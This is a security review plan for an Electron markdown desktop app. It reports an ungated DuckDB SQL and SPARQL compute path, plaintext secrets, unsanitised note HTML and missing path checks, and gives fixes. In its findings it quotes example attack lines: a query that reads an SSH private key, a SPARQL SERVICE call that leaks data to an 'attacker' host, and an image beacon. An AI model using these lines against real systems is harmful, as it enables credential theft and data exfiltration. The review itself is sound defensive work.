# Security Review Plan
Generated: 2026-07-16
Scope: entire project (/Users/davegriffith/minerva)

## Executive Summary

Minerva is a local-first Electron desktop markdown IDE. Its threat model is not a
public web server; the realistic attackers are **malicious note / knowledge-base
content opened by the user**, **malicious third-party skills**, **malicious LLM
output**, and **untrusted markdown/graph files shared between users**. Judged
against that model, the codebase is in **good** shape and shows deliberate,
well-documented security engineering:

- Electron hardening is exemplary: `contextIsolation: true`, `sandbox: true`,
  `nodeIntegration: false` applied through a single `HARDENED_WEB_PREFERENCES`
  constant; a strict header-based CSP with no `unsafe-inline` in `script-src`;
  per-window `setWindowOpenHandler` + `will-navigate` guards; a narrow
  permission handler that only ever grants `media` to the app's own origin.
- The preload bridge exposes a typed, enumerated API surface — no raw
  `ipcRenderer` is handed to the renderer.
- `assertSafePath()` gives sound path-traversal protection (with symlink/realpath
  handling) and is used consistently across the `fs.ts` file-I/O surface.
- The browser-clipper loopback HTTP server has a genuinely careful posture:
  loopback bind, constant-time secret compare, DNS-rebinding `Host` check,
  extension-origin allowlist, body-size caps.
- No hardcoded API keys, tokens, or private keys were found in the source tree.
- LLM graph mutations are architecturally routed through an approval engine with
  a CI-fatal write guard.
- Auto-update uses the signed, HTTPS `update.electronjs.org` Squirrel feed.

No **Critical** issues were confirmed. The most material findings are: (1) the
compute-cell **trust prompt gates only Python, while DuckDB SQL and SPARQL cells —
which can read/write arbitrary local files and reach the network — pass through
ungated**; (2) LLM API key and other secrets are stored in **plaintext JSON**
rather than the OS keychain; (3) the primary note preview renders untrusted note
HTML with `markdown-it html:true` + `{@html}` and **relies solely on CSP** (no
DOMPurify) to prevent script execution; and (4) three `shell:*` IPC handlers build
filesystem paths **without `assertSafePath`**, deviating from the codebase's own
stated invariant.

## Security Findings

### Critical Vulnerabilities
None confirmed.

### High Priority Issues
- **H1 — DuckDB SQL and SPARQL compute cells are not trust-gated but can read/write local files and reach the network.**
  `src/renderer/lib/compute/run-cell-with-trust.ts:56` gates only `language === 'python'`;
  the module comment (`run-cell-with-trust.ts:14-15`) asserts SQL/SPARQL "don't
  execute arbitrary code," which is inaccurate for DuckDB.

### Medium Priority Issues
- **M1 — Secrets (LLM API key, clipper secret, site cookies) stored in plaintext**, not via Electron `safeStorage` / OS keychain. `src/main/llm/settings.ts:62`.
- **M2 — Note preview renders untrusted markdown with `html:true` + `{@html}` and no DOMPurify**, relying only on CSP. `src/renderer/lib/components/Preview.svelte:221,1494`.
- **M3 — `shell:*` IPC handlers omit `assertSafePath`** (path traversal → open arbitrary file with OS default app / reveal / spawn terminal). `src/main/ipc/register-shell.ts:23-60`.

### Low Priority Issues
- **L1 — Python compute = full-privilege RCE by design**, mitigated only by a click-through, sticky per-project trust prompt. `src/main/compute/python-kernel.ts`, `run-cell-with-trust.ts`.
- **L2 — LLM write guard is a module-global counter**, explicitly a dev guardrail, not a runtime boundary; the real boundary is architectural discipline. `src/main/graph/write-guard.ts`.
- **L3 — Mermaid / Vega renderers assign generated markup via `innerHTML`**, relying on library sanitization + CSP. `src/renderer/lib/markdown/mermaid-renderer.ts:129`, `vega-renderer.ts`.
- **L4 — CSP `img-src https:` + broad `connect-src` allow privacy beacons.** A malicious note can phone-home an image/CSS background to any HTTPS host on open. `src/main/security-helpers.ts:33-74`.
- **L5 — Third-party skills are prompt-injection surface** (not code exec — the template engine is non-executing). `src/main/skills/template.ts`.
- **L6 — Dependency audit not automatable via pnpm** (npm quick-audit endpoint retired, HTTP 410); no SCA gate currently runs. Informational.

## Vulnerability Details

### H1 — SQL / SPARQL compute cells bypass the trust gate and can touch the filesystem & network

**Description.** Minerva runs fenced compute cells (```python, ```sql, ```sparql)
on explicit user action. Python execution is gated behind a per-project first-run
"Run Python cells in this thoughtbase?" trust prompt
(`src/renderer/lib/compute/run-cell-with-trust.ts:56-73`). SQL and SPARQL cells
are deliberately passed straight through:

- `run-cell-with-trust.ts:14-15` — "SQL / SPARQL fences pass straight through;
  they don't execute arbitrary code."
- `src/main/compute/executors/sql.ts:21` runs the cell text verbatim through
  DuckDB via `runQuery` → `src/main/sources/tables.ts` (`DuckDBInstance.create(':memory:')`).
- `src/main/compute/executors/sparql.ts:20` runs the cell text through Comunica's
  `queryGraph` (`src/main/graph/queries.ts:289`).

The premise is incorrect. DuckDB SQL is not a sandboxed dialect: `read_csv_auto`,
`read_text`, `read_blob`, `glob(...)`, and `COPY (…) TO '<path>'` let a query
**read and write arbitrary local files** (e.g. `SELECT * FROM read_text('/Users/you/.ssh/id_rsa')`).
Depending on DuckDB extension autoloading, `httpfs` further enables network
access. Comunica SPARQL supports `SERVICE <http://…>` federation, so a
```sparql fence containing `SERVICE <http://attacker/?leak=…>` can **exfiltrate
graph contents over the network** when the cell is run.

**Impact.** A shared/untrusted thoughtbase can embed a ```sql or ```sparql cell
that, when the user clicks Run, silently reads sensitive local files (surfacing
them in cell output for social-engineering, or writing them elsewhere on disk) or
beacons/exfiltrates data — with **none** of the warning the sibling Python path
shows. Execution is user-initiated (not automatic on preview), which caps
severity below Critical, but the missing warning plus the incorrect "safe"
assumption make this the most material gap.

**Affected files/components.**
- `src/renderer/lib/compute/run-cell-with-trust.ts:14-15,50-74`
- `src/main/compute/executors/sql.ts`
- `src/main/compute/executors/sparql.ts`
- `src/main/sources/tables.ts:47` (in-memory DuckDB instance; no extension/file-access lockdown)
- `src/main/graph/queries.ts:289-339` (Comunica engine; SERVICE not disabled)

**Recommended fix.**
- Extend the trust gate to cover **all** executable compute languages (a single
  per-project "run compute cells" consent), or add a distinct SQL/SPARQL prompt.
  Fix the misleading comment.
- Harden DuckDB: disable extension autoinstall/autoload
  (`SET autoinstall_known_extensions=false; SET autoload_known_extensions=false;`),
  and if feasible constrain file access (`SET enable_external_access=false`) —
  balancing against the legitimate need to `read_csv` project files, which could
  be satisfied by pre-registering vault CSVs as views (already done in
  `tables.ts`) and disabling ad-hoc external file access.
- Disable SPARQL `SERVICE` federation in the Comunica config used for note/compute
  queries, or restrict it to an allowlist.

### M1 — Secrets stored in plaintext on disk

**Description.** The Anthropic API key is persisted as plaintext JSON:
`saveSettings` writes `JSON.stringify(settings, …)` to
`userData/llm-settings.json` (`src/main/llm/settings.ts:61-63`), and
`getSettings` reads it back (`:41-51`). No use of Electron `safeStorage`
exists anywhere in the tree (grep for `safeStorage` returns nothing). The
privileged-sites config and its persistent cookie partitions
(`src/main/privileged-sites.ts`) and the clipper shared secret are likewise
stored unencrypted under `userData`.

**Impact.** Any process or user with read access to the app's `userData`
directory (malware, backup sync, another local user, a shared machine) can lift
the Anthropic key and any site session cookies. For a single-user desktop app
this is a common and accepted pattern, but `safeStorage` (Keychain on macOS,
DPAPI on Windows, libsecret on Linux) is available and materially raises the bar.

**Affected files/components.** `src/main/llm/settings.ts:62`;
`src/main/privileged-sites.ts:33-35`; clipper secret persistence
(`src/main/clipper/clipper-config.ts`).

**Recommended fix.** Encrypt the API key (and clipper secret) at rest with
`safeStorage.encryptString` / `decryptString`, falling back to plaintext only
when `safeStorage.isEncryptionAvailable()` is false; never log the decrypted
value.

### M2 — Untrusted note HTML rendered with `html:true` + `{@html}` and no DOMPurify

**Description.** The primary note renderer builds markdown-it with
`html: true, linkify: true` (`src/renderer/lib/components/Preview.svelte:220-222`)
and injects the result with `{@html rendered}` (`:1494`, plus `{@html}` for
bibliography entries `:1500` and tooltip HTML `:1510`). There is no DOMPurify
pass on this output (DOMPurify is imported only in
`src/renderer/lib/compute-output-sanitize.ts` for compute output, not for the
note body). Raw HTML embedded in a note therefore reaches the DOM verbatim.

The reason this is not Critical is the strong CSP
(`src/main/security-helpers.ts:33-74`): `script-src` has no `'unsafe-inline'`,
so inline `<script>` and inline event handlers (`onerror=`) are blocked;
`object-src 'none'`, `frame-src 'none'`, `frame-ancestors 'none'`,
`form-action 'none'` close plugin/iframe/form vectors; `base-uri 'self'` blocks
`<base>` hijacking. Script execution via note HTML is thus currently prevented by
CSP.

**Impact.** Defense is single-layer: a future CSP regression, an Electron/Chromium
CSP-bypass, or a subtle markup trick would turn stored note content directly into
renderer XSS (which, in Electron, borders on RCE via the IPC surface). Even today,
residual non-script vectors survive: `<img src="https://attacker/beacon">` and
CSS `background:url(https://…)` (allowed by `img-src https:` and
`style-src 'unsafe-inline'`) let a note phone-home on open (privacy/tracking leak
across shared notes).

**Affected files/components.** `src/renderer/lib/components/Preview.svelte:220-222,1494,1500,1510`.

**Recommended fix.** Run note HTML through DOMPurify (a strict allowlist mirroring
`compute-output-sanitize.ts`) before `{@html}`, as defense in depth behind CSP.
Consider stripping/So-restricting remote `img`/CSS URL loads for untrusted notes,
or gating remote-content loading behind a per-project setting.

### M3 — `shell:*` IPC handlers omit `assertSafePath`

**Description.** `assertSafePath()` is the codebase's stated invariant
("always use it", CLAUDE.md; `src/main/notebase/fs.ts:96-113`) and is applied
consistently across `fs.ts`. The shell handlers, however, build paths with a bare
`path.join(rootPath, relativePath)`:

- `SHELL_REVEAL_FILE` — `src/main/ipc/register-shell.ts:23-28`
- `SHELL_OPEN_IN_DEFAULT` — `:30-32` (`shell.openPath(path.join(rootPath, relativePath))`)
- `SHELL_OPEN_IN_TERMINAL` — `:34-60`

A `relativePath` of `../../../…` escapes the project root. `SHELL_OPEN_IN_DEFAULT`
would then open an arbitrary out-of-project file with its OS default handler
(on macOS, opening an `.app`/script by path can execute it); the others reveal or
open a terminal at an arbitrary location.

**Impact.** The `relativePath` values originate from the renderer's file tree /
tab context menus, so attacker control is limited in the current UI — this is
primarily a defense-in-depth / invariant-consistency gap. But a renderer bug or a
future feature that routes note-derived paths here would become a real
traversal-to-launch primitive. Note the terminal handler correctly uses
`spawn` with explicit args (no shell) — command injection is not the issue; path
scope is.

**Affected files/components.** `src/main/ipc/register-shell.ts:23-60`.

**Recommended fix.** Route all three through `assertSafePath(rootPath, relativePath)`
before calling `shell.showItemInFolder` / `shell.openPath` / `spawn`, mirroring
the rest of `fs.ts`.

## Security Improvement Plan

### Immediate (this iteration)
- **H1:** Extend the compute trust gate to SQL and SPARQL (or add a dedicated
  prompt); fix the incorrect "don't execute arbitrary code" comment. Disable
  DuckDB extension autoload and SPARQL `SERVICE` federation for note/cell queries.
- **M3:** Add `assertSafePath` to the three `shell:*` handlers.

### Short-term
- **M1:** Move the Anthropic API key and clipper secret to `safeStorage`.
- **M2:** Add a DOMPurify pass to the note-preview `{@html}` paths; audit the
  other `{@html}` sites (`SourceDetail.svelte`, `ComputeDraftCard.svelte`,
  `MessageList.svelte`) for the same guarantee (`MessageList` already uses
  `html:false`, which is correct).
- **L6:** Wire an SCA gate that still works (GitHub Dependabot, `osv-scanner`, or
  `npm audit --json` against the bulk advisory endpoint) into CI.

### Long-term
- **L1:** Consider a real sandbox for Python execution (separate user, container,
  or seccomp/AppArmor profile) so "trust this thoughtbase" is not equivalent to
  full-user RCE. At minimum, make the trust prompt non-suppressible per run for
  freshly-cloned/shared thoughtbases and surface it in the compute settings.
- **L4:** Offer a "block remote content in notes" mode; tighten `connect-src` /
  `img-src` where the local model/OCR CDNs can be bundled instead of fetched.
- Add an integrity/pinning check for runtime-fetched artifacts (Whisper model,
  embedding model) — verify a known hash of downloaded weights before use.

## Compliance Status (OWASP Top 10, adapted to a desktop app)

| OWASP category | Status | Notes |
|---|---|---|
| A01 Broken Access Control | Mostly covered | `assertSafePath` sound and widely used; **gap: `shell:*` handlers (M3)**. |
| A02 Cryptographic Failures | Gap | Secrets in plaintext (M1); `safeStorage` unused. |
| A03 Injection | Partial | No SQL/shell string-interpolation injection in the traditional sense (parameterized/explicit-arg spawn). **But user-run DuckDB SQL / SPARQL have unrestricted file+network capability (H1).** SPARQL/DuckDB queries are user-authored, not app-interpolated. |
| A04 Insecure Design | Good | Approval-engine trust model, write guard, loopback clipper design are strong. Python-RCE-by-design is the accepted trade-off (L1). |
| A05 Security Misconfiguration | Good | Electron hardening + CSP are model-grade; main residual is single-layer reliance on CSP for note HTML (M2). |
| A06 Vulnerable Components | Unknown | Automated audit could not run (L6); no committed advisories, but no SCA gate. |
| A07 Auth/Session | N/A / Good | Local app; clipper secret uses constant-time compare; site partitions isolated. |
| A08 Integrity Failures | Partial | Auto-update is signed over HTTPS (good); runtime-fetched ML models are not hash-pinned. |
| A09 Logging/Monitoring | Adequate | Warnings for guard trips; ensure secrets are never logged after M1. |
| A10 SSRF | Partial | Main-process fetches are curated; **DuckDB httpfs / SPARQL SERVICE are user-reachable SSRF-like egress (H1)**. |

## Recommendations

1. Treat compute cells uniformly: any language that can touch the filesystem or
   network must be behind the trust gate, and the sandboxing story (H1, L1) is the
   single highest-leverage hardening in the app.
2. Adopt `safeStorage` for all at-rest secrets (M1).
3. Make note rendering defense-in-depth: DOMPurify behind CSP, not CSP alone (M2).
4. Restore the `assertSafePath` invariant everywhere a renderer-supplied path
   reaches the filesystem or shell (M3).
5. Stand up a working dependency-scanning gate in CI (L6) and hash-pin
   runtime-downloaded model artifacts.
6. Keep the existing strengths (Electron hardening, approval engine, clipper
   posture, typed preload) as regression-guarded invariants — they are the reason
   this review has no Critical findings.

## Risk Assessment

- **Current overall risk: Low-to-Moderate** for the intended local, single-user
  threat model. There is no remote network attack surface beyond the loopback
  clipper (well-guarded) and curated main-process fetches. The realistic worst
  case is a user opening a shared/untrusted thoughtbase and running a compute cell
  (H1 / L1) or a CSP regression exposing note-HTML XSS (M2). Secret theft (M1)
  requires local filesystem access.
- **Post-mitigation target: Low.** Closing H1 (uniform trust gate + DuckDB/SPARQL
  egress lockdown), M1 (`safeStorage`), M2 (DOMPurify behind CSP), and M3
  (`assertSafePath` on shell handlers) removes every non-inherent finding and
  reduces the Python-RCE-by-design residual (L1) to an explicit, well-signposted
  user choice.
